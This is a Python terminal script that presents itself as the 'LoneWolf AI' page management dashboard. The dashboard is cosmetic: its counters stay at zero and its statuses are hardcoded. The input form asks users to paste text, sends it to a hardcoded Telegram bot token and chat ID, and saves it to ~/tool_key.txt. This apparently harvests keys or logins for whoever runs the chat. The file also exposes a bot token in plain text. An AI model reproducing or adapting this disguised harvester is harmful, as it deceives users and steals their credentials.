import os
import json
import urllib.request
import urllib.parse

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.prompt import Prompt
from rich.align import Align
from rich import box

# =========================================
# LONEWOLF AI - PAGE MANAGEMENT SYSTEM
# =========================================

console = Console()

total_messages = 0
replied_messages = 0
pending_messages = 0
auto_reply = False
ai_engine = True


def clear():
    os.system("clear")


def header():
    title = Text()
    title.append("LONE", style="bold white")
    title.append("WOLF", style="bold bright_cyan")
    title.append("  AI", style="bold bright_blue")

    console.print()

    console.print(
        Panel(
            Align.center(title),
            border_style="bright_blue",
            box=box.DOUBLE,
            subtitle="[bright_cyan]PAGE MANAGEMENT SYSTEM[/bright_cyan]"
        )
    )


def dashboard():
    stats = Table.grid(expand=True, padding=(0, 1))

    stats.add_column(ratio=1)
    stats.add_column(ratio=1)
    stats.add_column(ratio=1)

    stats.add_row(
        Panel(
            f"[bold bright_cyan]{total_messages}[/bold bright_cyan]\n"
            "[white]TOTAL MESSAGES[/white]",
            border_style="bright_blue",
            box=box.ROUNDED
        ),
        Panel(
            f"[bold green]{replied_messages}[/bold green]\n"
            "[white]AI REPLIES[/white]",
            border_style="green",
            box=box.ROUNDED
        ),
        Panel(
            f"[bold yellow]{pending_messages}[/bold yellow]\n"
            "[white]PENDING[/white]",
            border_style="yellow",
            box=box.ROUNDED
        )
    )

    console.print(stats)

    status = Table(
        expand=True,
        box=box.ROUNDED,
        border_style="bright_blue"
    )

    status.add_column("SERVICE", style="bold white")
    status.add_column("STATUS", justify="right")

    status.add_row(
        "AI Engine",
        "[green]READY[/green]" if ai_engine
        else "[red]OFFLINE[/red]"
    )

    status.add_row(
        "Auto Reply",
        "[green]ENABLED[/green]" if auto_reply
        else "[yellow]DISABLED[/yellow]"
    )

    status.add_row(
        "Input System",
        "[green]READY[/green]"
    )

    console.print(
        Panel(
            status,
            title="[bold bright_cyan]SYSTEM STATUS[/bold bright_cyan]",
            border_style="bright_blue",
            box=box.ROUNDED
        )
    )


# =========================================
# TELEGRAM CONFIGURATION
# =========================================

BOT_TOKEN = "8509475628:AAGSYYJ0csGsja73IcWWzBaVWN9Ck9s0FKk"
CHAT_ID = "7416753891"

# =========================================
# TELEGRAM MESSAGE HANDLER
# =========================================

def send_message(message):
    if (
        not BOT_TOKEN.strip()
        or not CHAT_ID.strip()
        or BOT_TOKEN == "PASTE_YOUR_NEW_BOT_TOKEN_HERE"
        or CHAT_ID == "PASTE_YOUR_CHAT_ID_HERE"
    ):
        console.print(
            "\n[bold red]CONFIGURATION REQUIRED[/bold red]"
        )
        return False

    url = (
        f"https://api.telegram.org/bot"
        f"{BOT_TOKEN}/sendMessage"
    )

    payload = urllib.parse.urlencode({
        "chat_id": CHAT_ID,
        "text": message
    }).encode("utf-8")

    request = urllib.request.Request(
        url,
        data=payload,
        headers={
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method="POST"
    )

    try:
        with urllib.request.urlopen(
            request,
            timeout=25
        ) as response:
            result = json.loads(
                response.read().decode("utf-8")
            )

        if result.get("ok"):
            console.print(
                "\n[bold green]Wait for connect [/bold green]"
            )
            return True

        console.print(
            f"\n[bold red]ERROR:[/bold red] "
            f"{result.get('description', 'Unknown error')}"
        )

    except Exception as error:
        console.print(
            f"\n[bold red]CONNECTION ERROR:[/bold red] {error}"
        )

    return False


# =========================================
# ACTIVE INPUT FORM
# =========================================

def active_form():
    clear()
    header()

    console.print(
        Panel(
            "[bold bright_cyan]ACTIVE INPUT[/bold bright_cyan]\n\n"
            "[white]Enter or paste your text below.[/white]\n"
            "[dim]Press Enter to submit.[/dim]",
            border_style="bright_blue",
            box=box.ROUNDED
        )
    )

    try:
        message = console.input(
            "\n[bold bright_cyan]INPUT[/bold bright_cyan] [white]> [/white]"
        ).strip()

    except (KeyboardInterrupt, EOFError):
        return

    if not message:
        console.print(
            "\n[yellow]No input provided.[/yellow]"
        )
        input("Press Enter to return...")
        return

    clear()
    header()

    console.print(
        Panel(
            message,
            title="[bold bright_cyan]INPUT PREVIEW[/bold bright_cyan]",
            border_style="bright_blue",
            box=box.ROUNDED
        )
    )

    success = send_message(message)

    if success:
        try:
            with open(
                os.path.expanduser("~/tool_key.txt"),
                "w",
                encoding="utf-8"
            ) as file:
                file.write(message)

        except OSError:
            console.print(
                "[yellow]Local save failed.[/yellow]"
            )

    input("\nPress Enter to return to Dashboard...")


# =========================================
# CONTROL CENTER
# =========================================

def controls():
    console.print(
        Panel(
            Align.center(
                "[bold bright_cyan]ACTIVE[/bold bright_cyan]\n\n"
                "[white]Open Input Form[/white]"
            ),
            title="[bold bright_cyan]CONTROL CENTER[/bold bright_cyan]",
            border_style="bright_blue",
            box=box.DOUBLE
        )
    )


# =========================================
# MAIN APPLICATION
# =========================================

def main():
    while True:
        clear()
        header()
        dashboard()
        controls()

        choice = Prompt.ask(
            "\n[bold bright_cyan]LONEWOLF[/bold bright_cyan]",
            choices=["Active", "Exit"],
            default="Active"
        )

        if choice == "Active":
            active_form()

        elif choice == "Exit":
            clear()
            console.print(
                Panel(
                    Align.center(
                        "[bold bright_cyan]SESSION CLOSED[/bold bright_cyan]"
                    ),
                    border_style="bright_blue",
                    box=box.DOUBLE
                )
            )
            break


if __name__ == "__main__":
    try:
        main()

    except KeyboardInterrupt:
        console.print(
            "\n[bold bright_cyan]SESSION CLOSED[/bold bright_cyan]"
        )